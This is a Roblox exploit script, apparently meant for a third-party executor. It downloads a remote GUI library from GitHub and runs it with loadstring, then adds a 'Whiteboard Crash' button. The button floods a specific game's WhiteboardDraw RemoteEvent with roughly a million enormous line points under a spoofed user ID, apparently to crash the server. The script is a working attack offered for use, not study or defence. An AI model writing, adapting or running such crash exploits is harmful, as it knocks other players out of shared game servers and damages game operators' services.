--[=[
    written by forka42
    ---
    https://github.com/forka42
    https://www.roblox.com/games/85257947422209
]=]

local Players = game:GetService('Players')
local RunService = game:GetService('RunService')

local httpget = getfenv().httpget
local s, r = pcall(httpget, game, 'https://raw.githubusercontent.com/forka42/script-catalog/refs/heads/main/lib/wally-modified.lua', true)
local f
if s then
	f = loadstring(r)
else
	return error(r)
end
if type(f) == 'function' then
	wally = f()
end
assert(wally, 'Failed to load wally')

local __applyCustom = function(v)
	coroutine.resume(coroutine.create(function()
		repeat
			task.wait()
		until v.object:FindFirstChildWhichIsA('TextLabel')
		repeat
			task.wait()
		until v.object:FindFirstChild('Underline')

		local TextLabel = v.object:FindFirstChildWhichIsA('TextLabel')
		local Underline = v.object:FindFirstChild('Underline')

		while true do
			RunService.Stepped:Wait()
			local hue = tick() % 5 / 5
			TextLabel.Font = Enum.Font.Michroma
			TextLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
			TextLabel.TextStrokeColor3 = Color3.fromHSV(hue, 1, 0.5)
			TextLabel.TextStrokeTransparency = 0.5
			Underline.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
		end
	end))
end

local default = {
	topcolor = Color3.fromRGB(30, 30, 30),
	titlecolor = Color3.new(1, 1, 1),
	underlinecolor = Color3.new(1, 0, 0),
	bgcolor = Color3.fromRGB(35, 35, 35),
	boxcolor = Color3.fromRGB(35, 35, 35),
	btncolor = Color3.fromRGB(25, 25, 25),
	dropcolor = Color3.fromRGB(25, 25, 25),
	sectncolor = Color3.fromRGB(25, 25, 25),
	bordercolor = Color3.fromRGB(60, 60, 60),
	font = Enum.Font.Jura,
	titlefont = Enum.Font.Michroma,
	fontsize = 17,
	titlesize = 18,
	textstroke = 1,
	titlestroke = 1,
	strokecolor = Color3.fromRGB(0, 0, 0),
	textcolor = Color3.new(1, 1, 1),
	titletextcolor = Color3.new(1, 1, 1),
	placeholdercolor = Color3.new(1, 1, 1),
	titlestrokecolor = Color3.fromRGB(0, 0, 0),
}

wally.options = setmetatable({}, { __index = default })

local LocalPlayer = Players.LocalPlayer
local PlayerGui = (RunService:IsStudio() and LocalPlayer:FindFirstChildWhichIsA('PlayerGui')) or game:GetService('CoreGui')

local Window = wally:CreateWindow('RMM Remake', { Parent = PlayerGui })
__applyCustom(Window)

Window:Button('Whiteboard Crash', function()
	local Event = select(2, pcall(function()
		return (workspace :: any).Map.ProjectVinylIsland.Whiteboard.Board.WhiteboardDraw
	end))

	if typeof(Event) ~= 'Instance' or not Event:IsA('RemoteEvent') then
		return warn('WhiteboardDraw remote not found')
	end

	local points = {}

	for y = -1e8, 1e8, 200 do
		table.insert(points, Vector2.new(-1e8, y))
		table.insert(points, Vector2.new(1e8, y))
	end

	print('Strokes / points:', #points / 2, #points)

	return Event:FireServer({
		markerName = 'BlackMarker',
		color = 4278190080,
		playerName = 'the end',
		points = points,
		userId = 1,
		thickness = 255,
	})
end)